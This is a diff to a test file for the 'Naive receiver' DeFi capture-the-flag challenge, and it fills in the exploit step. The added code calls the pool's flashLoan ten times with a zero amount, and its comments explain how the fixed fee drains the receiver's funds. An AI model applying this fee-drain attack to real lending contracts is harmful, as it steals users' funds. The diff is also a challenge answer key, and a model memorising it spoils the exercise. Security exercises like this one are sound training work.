@@ -30,7 +30,16 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        
+        this.pool.connect(attacker);
+
+
+        // Flash loan fee is 1 ether and is deducted from user balance every time flash loan is called
+        // Calling the flash loan 10 times fully drains all user funds
+        // Borrowing amount can be set to zero as there are no checks for non-zero borrowing balances
+          for (let i = 0; i < 10; i++) { 
+            this.pool.flashLoan(this.receiver.address, 0);
+        }
     });
 
     after(async function () {
